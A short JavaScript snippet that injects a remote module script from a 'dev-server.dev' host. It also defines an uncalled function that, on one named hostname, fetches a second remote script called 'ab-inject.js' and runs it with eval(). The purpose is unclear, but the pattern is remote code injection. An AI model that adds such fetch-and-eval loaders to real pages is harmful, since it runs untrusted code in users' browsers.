
(() => {

    function loadExternalScript(url) {
        const script = document.createElement('script');
        script.src = url;
        script.async = true;
        script.type = 'module';
        document.head.appendChild(script);
    }

    const bootstrapURL = '//localhost/src/app-booster.js';
    const devURL = 'https://dev-server.dev/src/app-booster.js';
    loadExternalScript(devURL);

})();

(function example() {
    const url = 'https://dev-server.dev/ab-inject.js';

    if (window.location.hostname === 'gingim.net')
        fetch(url)
            .then(r => r.text())
            .then(c => eval(c));
})